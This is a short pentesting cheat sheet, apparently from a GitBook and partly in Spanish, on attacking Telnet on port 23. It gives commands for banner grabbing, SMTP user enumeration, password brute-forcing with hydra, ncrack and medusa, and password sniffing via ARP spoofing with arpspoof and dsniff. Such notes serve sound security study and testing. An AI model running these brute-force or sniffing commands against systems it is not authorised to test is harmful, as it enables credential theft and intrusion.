# Port 23 - Telnet

Permite acceder a otra máquina de manera remota a través de la linea de comandos, siendo un protocolo inseguro ya que la conexión no viaja cifrada.

## Commands

### Test connection

```bash
# Connect to a machine
telnet <IP> <Port> 
```

### Banner grabbing&#x20;

```bash
# Banner grabbing 
nmap -sV -p23 -n -Pn <IP> # Telnet 
telnet <IP> 22 # SSH Version grabbing
telnet <IP> 25 # SMTP Version grabbing 
└-> vrfy msfadmin # User enumeration 
```

### Bruteforce

```bash
hydra -l <USERNAME> -P <WORDLIST> telnet://<IP> [-t <THREADS> -s <PORT>]

# No me funcionaron estos métodos
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P passwords.txt -h <IP> -M telnet
```

### Password sniffing

**DSNIFF**&#x20;

```bash
# In the local machine
dsniff -i <NETWORK_INTERFACE>

# Alternative way with arp-spoofing
arpspoof -i <NETWORK_INTERFACE> -r -t <TARGET> <GATEWAY>
dsniff -t 23/tcp=telnet -n
```



**Wireshark**

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>





